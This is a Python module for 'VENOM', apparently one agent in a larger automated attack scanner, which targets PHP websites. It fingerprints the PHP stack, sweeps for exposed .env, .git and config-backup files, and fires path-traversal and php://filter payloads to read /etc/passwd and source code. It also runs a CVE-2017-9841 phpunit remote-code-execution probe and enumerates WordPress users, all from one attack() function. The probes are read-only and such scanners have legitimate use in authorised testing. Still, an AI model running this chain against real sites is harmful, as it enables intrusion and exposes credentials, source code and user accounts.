"""VENOM · PHP 全自动扫描注入 Agent.

Named agent for the PHP attack surface: fingerprint -> exposure sweep -> LFI /
filter-chain / RCE probes -> verdict. It is dispatched automatically by the
fast path whenever recon sees a PHP stack, and it runs through the same pinned
egress exit as the rest of the scan.

Evidence rule (same as the rest of FACAI): nothing is reported CONFIRMED without
a differential or self-verifying observation. A file that merely returns 200 is
not proof; the probe must read back content only the server could produce
(`root:x:0:0`, `[fonts]`, a decoded `<?php` blob, or an executed marker echo).

Probes are read-only by construction: the only code-execution check prints a
fixed marker string and never writes, uploads, or deletes anything.
"""
import base64
import concurrent.futures
import json
import re
import time
from urllib.parse import parse_qsl, quote, urljoin, urlsplit

from . import net_client

AGENT = {
    'id': 'venom',
    'name': 'VENOM',
    'title': 'PHP 全自动扫描注入 Agent',
    'version': '1.0',
    'scope': 'php',
}

# ------------------------------------------------------------------ markers

PASSWD_MARKER = 'root:x:0:0'
WININI_MARKER = '[fonts]'
PHP_MARKER = b'<?php'
EXEC_MARKER = 'VENOM_EXEC_9f3a'

# Parameters that carry a file-ish value in PHP applications. Ordered by how
# often they appear in real LFI sinks, so the cheapest hits come first.
ASSET_SUFFIXES = ('.css', '.js', '.mjs', '.map', '.png', '.jpg', '.jpeg', '.gif',
                  '.svg', '.webp', '.ico', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.pdf')

LFI_PARAMS = ('file', 'page', 'path', 'template', 'include', 'inc', 'url',
              'lang', 'view', 'load', 'module', 'doc', 'root', 'pg', 'style',
              'content', 'conf', 'cfg', 'dir', 'folder', 'read', 'name',
              'option', 'action', 'theme', 'skin', 'layout')

TRAVERSAL_PAYLOADS = (
    '../../../../../../etc/passwd',
    '....//....//....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    '/etc/passwd',
    '..\\..\\..\\..\\..\\windows\\win.ini',
    'C:\\Windows\\win.ini',
)

FILTER_PAYLOADS = (
    'php://filter/convert.base64-encode/resource=index',
    'php://filter/convert.base64-encode/resource=../index',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
)

# Exposure sweep: (path, detector, label, severity). The detector receives the
# response text and returns True only for content that proves the file exists.
EXPOSURES = (
    ('/phpinfo.php', lambda t: 'PHP Version' in t and 'php.ini' in t.lower(), 'phpinfo', 'HIGH'),
    ('/info.php', lambda t: 'PHP Version' in t and 'php.ini' in t.lower(), 'phpinfo', 'HIGH'),
    ('/test.php', lambda t: 'PHP Version' in t and 'php.ini' in t.lower(), 'phpinfo', 'HIGH'),
    ('/.env', lambda t: 'APP_KEY=' in t or ('DB_PASSWORD' in t and 'DB_HOST' in t), 'env', 'CRITICAL'),
    ('/.env.bak', lambda t: 'APP_KEY=' in t or 'DB_PASSWORD' in t, 'env-backup', 'CRITICAL'),
    ('/config.php.bak', lambda t: '<?php' in t and ('password' in t.lower() or 'db_' in t.lower()),
     'config-backup', 'CRITICAL'),
    ('/wp-config.php.bak', lambda t: 'DB_PASSWORD' in t or 'DB_NAME' in t, 'wp-config-backup', 'CRITICAL'),
    ('/db.php.bak', lambda t: '<?php' in t and ('mysql' in t.lower() or 'password' in t.lower()),
     'db-backup', 'CRITICAL'),
    ('/index.php~', lambda t: '<?php' in t, 'editor-backup', 'HIGH'),
    ('/index.php.bak', lambda t: '<?php' in t, 'editor-backup', 'HIGH'),
    ('/index.php.swp', lambda t: 'b0VIM' in t or 'VIM' in t, 'vim-swap', 'HIGH'),
    ('/composer.json', lambda t: '"require"' in t and '"name"' in t, 'composer', 'MEDIUM'),
    ('/composer.lock', lambda t: '"packages"' in t, 'composer-lock', 'MEDIUM'),
    ('/.git/config', lambda t: '[core]' in t and 'repositoryformatversion' in t, 'git', 'CRITICAL'),
    ('/.git/HEAD', lambda t: t.strip().startswith('ref: refs/'), 'git-head', 'HIGH'),
    ('/adminer.php', lambda t: 'adminer' in t.lower() and '<form' in t.lower(), 'adminer', 'MEDIUM'),
    ('/phpmyadmin/', lambda t: 'phpmyadmin' in t.lower() and 'login' in t.lower(), 'phpmyadmin', 'MEDIUM'),
    ('/server-status', lambda t: 'Apache Server Status' in t, 'server-status', 'MEDIUM'),
    ('/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
     lambda t: EXEC_MARKER in t, 'phpunit-eval-stdin', 'CRITICAL'),
    ('/_ignition/health-check', lambda t: '"can_execute_commands"' in t or '"message"' in t,
     'laravel-ignition', 'HIGH'),
    ('/xmlrpc.php', lambda t: 'XML-RPC server accepts POST requests only' in t, 'xmlrpc', 'MEDIUM'),
)


def _get(host, path, pool=None, timeout=8, max_bytes=65536):
    return net_client.request(host, path, timeout=timeout, max_bytes=max_bytes,
                              egress_pool=pool)


def _post(host, path, body, pool=None, timeout=8, headers=None):
    return net_client.request(host, path, method='POST', body=body, timeout=timeout,
                              max_bytes=65536, egress_pool=pool, headers=headers or {})


def fingerprint(host, pool=None):
    """Decide whether the target is PHP at all, and record the evidence."""
    evidence = {}
    root = _get(host, '/')
    if root.get('error'):
        return {'php': False, 'error': root['error'], 'evidence': evidence}
    text = net_client.text_of(root)
    headers = root.get('headers') or {}
    powered = (headers.get('X-Powered-By') or '').strip()
    server = (headers.get('Server') or '').strip()
    cookies = headers.get('Set-Cookie') or ''
    signals = []
    if 'php' in powered.lower():
        signals.append(f'X-Powered-By: {powered}')
        match = re.search(r'PHP/(\d+\.\d+(?:\.\d+)?)', powered)
        if match:
            evidence['version'] = match.group(1)
    if 'php' in server.lower():
        signals.append(f'Server: {server}')
    if 'phpsessid' in cookies.lower():
        signals.append('Set-Cookie: PHPSESSID')
    php_links = re.findall(r'href=["\'][^"\']*?\.php\b', text, re.I)[:3]
    if php_links:
        signals.append(f'页面链接 {len(php_links)} 个 .php 入口')
    index = _get(host, '/index.php')
    if index.get('status') == 200 and not index.get('error'):
        signals.append('GET /index.php -> 200')
    evidence['signals'] = signals
    evidence['root_status'] = root.get('status')
    return {'php': bool(signals), 'evidence': evidence}


def sweep_exposures(host, pool=None):
    """Probe the known PHP exposure paths concurrently; keep only proven hits."""
    hits = []
    failures = []

    def probe(item):
        path, detect, label, severity = item
        try:
            response = _get(host, path)
        except Exception as exc:  # noqa: BLE001 - one path must not kill the sweep
            return {'path': path, 'error': f'{type(exc).__name__}: {exc}'}
        if response.get('error'):
            return {'path': path, 'error': response['error'][:160]}
        status = response.get('status') or 0
        text = net_client.text_of(response)
        if status == 200 and detect(text):
            marker = next((item for item in (PASSWD_MARKER, EXEC_MARKER)
                           if item in text), None)
            return {'path': path, 'label': label, 'severity': severity, 'status': status,
                    'evidence': text[:400].replace('\n', ' '),
                    'self_verifying': bool(marker), 'length': len(text)}
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool_exec:
        for result in pool_exec.map(probe, EXPOSURES):
            if result is None:
                continue
            if result.get('error'):
                failures.append(result)
            else:
                hits.append(result)
    return {'hits': hits, 'failed': failures[:6]}


def discover_targets(host, pool=None):
    """Collect parameterised entry points; LFI params rank first."""
    targets = []
    root = _get(host, '/', max_bytes=131072)
    if root.get('error'):
        return targets
    text = net_client.text_of(root)
    seen = set()

    def add(path, method, params, source):
        key = (path, tuple(params))
        if not params or key in seen:
            return
        # Static assets carry cache-busters, not file-include sinks. Sending
        # traversal payloads at a .css URL only burns the budget.
        if path.lower().split('?')[0].endswith(ASSET_SUFFIXES):
            return
        seen.add(key)
        targets.append({'path': path, 'method': method, 'params': list(params),
                        'source': source})

    for match in re.finditer(r'href=["\']([^"\'#]+\?[^"\'#]+)', text):
        parts = urlsplit(urljoin(f'https://{host}/', match.group(1)))
        if parts.netloc and parts.netloc.lower() != host:
            continue
        params = [name for name, _ in parse_qsl(parts.query, keep_blank_values=True)]
        add(parts.path or '/', 'GET', params, 'link')
        if len(targets) >= 20:
            break
    for match in re.finditer(r'<form[^>]*>(.*?)</form>', text, re.S | re.I):
        block = match.group(0)
        action = re.search(r'action=["\']([^"\']*)', block)
        method = (re.search(r'method=["\']([^"\']*)', block) or [None, 'get'])[1] or 'get'
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)', block)
        # Form actions are frequently absolute; the request layer needs a path,
        # not a URL (an absolute action would become https://host/https://...).
        action_path = '/'
        if action:
            parsed = urlsplit(urljoin(f'https://{host}/', action.group(1) or '/'))
            if not parsed.netloc or parsed.netloc.lower() == host:
                action_path = parsed.path or '/'
        add(action_path, method.upper(), inputs[:10], 'form')
        if len(targets) >= 40:
            break
    # PHP sinks are usually addressed directly even when not linked from the
    # home page; rank a few conventional entry points as low-priority targets.
    for path in ('/index.php', '/search.php', '/download.php', '/view.php', '/page.php'):
        params = routed_params(host, path, pool)
        if params:
            add(path, 'GET', params, 'conventional')
    targets.sort(key=lambda item: (0 if item['path'].lower().split('?')[0].endswith('.php') else 1,
                                   0 if any(p.lower() in LFI_PARAMS for p in item['params']) else 1))
    return targets


def routed_params(host, path, pool=None):
    """Parameters a .php endpoint actually answers to, discovered by reflection."""
    try:
        response = _get(host, path)
    except Exception:  # noqa: BLE001
        return []
    if response.get('error') or (response.get('status') or 0) != 200:
        return []
    text = net_client.text_of(response).lower()
    return [name for name in LFI_PARAMS if name + '=' in text or f'name="{name}"' in text]


def test_lfi(host, path, params, pool=None, deadline=None):
    """Confirm path traversal by reading a file only the server can produce.

    Bounded on purpose: a fast scan cannot afford 6 params x 6 payloads on
    every entry point, so the strongest three params and four payloads are
    tried, and the deadline cuts the sweep the moment the budget is spent.
    """
    confirmed = []
    ordered = [name for name in params if name.lower() in LFI_PARAMS] + \
              [name for name in params if name.lower() not in LFI_PARAMS]
    for name in ordered[:3]:
        for payload in TRAVERSAL_PAYLOADS[:4]:
            if deadline is not None and time.perf_counter() > deadline:
                return confirmed
            query = f'{quote(name)}={quote(payload, safe="")}'
            full = f'{path}?{query}' if '?' not in path else f'{path}&{query}'
            try:
                response = _get(host, full, timeout=6)
            except Exception:  # noqa: BLE001
                continue
            if response.get('error'):
                continue
            text = net_client.text_of(response)
            for marker, kind in ((PASSWD_MARKER, 'etc/passwd'), (WININI_MARKER, 'windows/win.ini')):
                if marker in text:
                    position = text.find(marker)
                    confirmed.append({'param': name, 'path': path, 'payload': payload,
                                      'target_file': kind, 'technique': 'lfi-traversal',
                                      'status': response.get('status'),
                                      'evidence': text[max(0, position - 40):position + 160]
                                      .replace('\n', ' ')})
                    return confirmed
    return confirmed


def test_filter_chain(host, path, params, pool=None, deadline=None):
    """php://filter read: decode base64 and require a real PHP open tag."""
    for name in ([item for item in params if item.lower() in LFI_PARAMS] or params)[:2]:
        for payload in FILTER_PAYLOADS[:2]:
            if deadline is not None and time.perf_counter() > deadline:
                return None
            query = f'{quote(name)}={quote(payload, safe="")}'
            full = f'{path}?{query}' if '?' not in path else f'{path}&{query}'
            try:
                response = _get(host, full, timeout=6)
            except Exception:  # noqa: BLE001
                continue
            if response.get('error'):
                continue
            raw = response.get('body') or b''
            for blob in re.findall(rb'[A-Za-z0-9+/]{80,}={0,2}', raw)[:3]:
                try:
                    decoded = base64.b64decode(blob, validate=True)
                except Exception:  # noqa: BLE001
                    continue
                if PHP_MARKER in decoded:
                    return {'param': name, 'path': path, 'payload': payload,
                            'technique': 'php-filter-chain',
                            'status': response.get('status'),
                            'decoded_bytes': len(decoded),
                            'evidence': decoded[:200].decode('utf-8', 'replace')}
    return None


def test_phpunit_rce(host, pool=None):
    """CVE-2017-9841: eval-stdin.php echoes a fixed marker; nothing is written."""
    path = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
    body = f'<?php echo "{EXEC_MARKER}"; ?>'.encode()
    try:
        response = _post(host, path, body, pool=pool,
                         headers={'Content-Type': 'application/x-www-form-urlencoded'})
    except Exception as exc:  # noqa: BLE001
        return {'path': path, 'error': f'{type(exc).__name__}: {exc}'}
    if response.get('error'):
        return {'path': path, 'error': response['error'][:160]}
    text = net_client.text_of(response)
    if EXEC_MARKER in text:
        return {'path': path, 'status': response.get('status'),
                'technique': 'phpunit-eval-stdin', 'marker': EXEC_MARKER,
                'evidence': f'POST {path} 回显执行标记 {EXEC_MARKER}'}
    return None


def test_wp_users(host, pool=None):
    """WordPress REST user enumeration: real only when JSON user objects return."""
    try:
        response = _get(host, '/wp-json/wp/v2/users?per_page=5')
    except Exception:  # noqa: BLE001
        return None
    if response.get('error') or (response.get('status') or 0) != 200:
        return None
    try:
        data = json.loads(net_client.text_of(response))
    except ValueError:
        return None
    if isinstance(data, list) and any(isinstance(item, dict) and item.get('slug') for item in data):
        return {'path': '/wp-json/wp/v2/users', 'users': [
            {'id': item.get('id'), 'slug': item.get('slug'), 'name': item.get('name')}
            for item in data[:5] if isinstance(item, dict)]}
    return None


def attack(host, findings=None, pool=None, budget_seconds=45, php_hint=False):
    """Run the VENOM chain and return evidence plus one verdict.

    `php_hint` is set by the caller when recon already proved a PHP stack
    (WordPress/Laravel/Drupal/Joomla/Magento). Hardened sites often hide every
    PHP header, so our own fingerprint alone would wrongly stop the chain.

    Verdicts: CONFIRMED_PHP_RCE > CONFIRMED_LFI > PHP_SURFACE_FOUND > NO_PHP.
    """
    started = time.perf_counter()
    result = {'agent': AGENT, 'host': host, 'fingerprint': {}, 'exposures': [],
              'confirmed': [], 'targets': [], 'chain': [], 'errors': []}
    fp = fingerprint(host, pool)
    if php_hint and not fp.get('php'):
        fp['php'] = True
        fp['evidence'] = dict(fp.get('evidence') or {}, hint='recon: PHP 栈指纹')
        result['chain'].append({'step': 'php-hint', 'source': 'recon'})
    result['fingerprint'] = fp
    if not fp.get('php'):
        result['verdict'] = 'NO_PHP'
        result['elapsed_ms'] = round((time.perf_counter() - started) * 1000, 1)
        return result
    result['chain'].append({'step': 'fingerprint', 'signals': len(fp['evidence'].get('signals') or [])})

    sweep = sweep_exposures(host, pool)
    result['exposures'] = sweep['hits']
    result['chain'].append({'step': 'exposure-sweep', 'hits': len(sweep['hits']),
                            'failed': len(sweep['failed'])})

    rce = test_phpunit_rce(host, pool)
    if rce:
        result['confirmed'].append({'kind': 'RCE', **rce})
        result['chain'].append({'step': 'phpunit-rce', 'hit': True})

    targets = discover_targets(host, pool)
    result['targets'] = [{'path': item['path'], 'params': item['params']} for item in targets[:6]]
    lfi_found = False
    deadline = started + max(6.0, min(budget_seconds, 20.0))
    for target in targets[:4]:
        if time.perf_counter() > deadline:
            result['chain'].append({'step': 'budget-exhausted'})
            break
        hits = test_lfi(host, target['path'], target['params'], pool, deadline=deadline)
        if hits:
            lfi_found = True
            for hit in hits:
                result['confirmed'].append({'kind': 'LFI', **hit})
            result['chain'].append({'step': 'lfi', 'path': target['path'], 'hits': len(hits)})
            break
        filtered = test_filter_chain(host, target['path'], target['params'], pool,
                                     deadline=deadline)
        if filtered:
            lfi_found = True
            result['confirmed'].append({'kind': 'LFI', **filtered})
            result['chain'].append({'step': 'php-filter', 'path': target['path']})
            break

    wp = test_wp_users(host, pool)
    if wp:
        result['confirmed'].append({'kind': 'USER_ENUM', **wp})
        result['chain'].append({'step': 'wp-users', 'users': len(wp['users'])})

    if any(item.get('kind') == 'RCE' for item in result['confirmed']):
        result['verdict'] = 'CONFIRMED_PHP_RCE'
    elif lfi_found:
        result['verdict'] = 'CONFIRMED_LFI'
    elif result['exposures'] or result['confirmed']:
        result['verdict'] = 'PHP_SURFACE_FOUND'
    else:
        result['verdict'] = 'NO_CONFIRMED_PHP'
    result['elapsed_ms'] = round((time.perf_counter() - started) * 1000, 1)
    return result
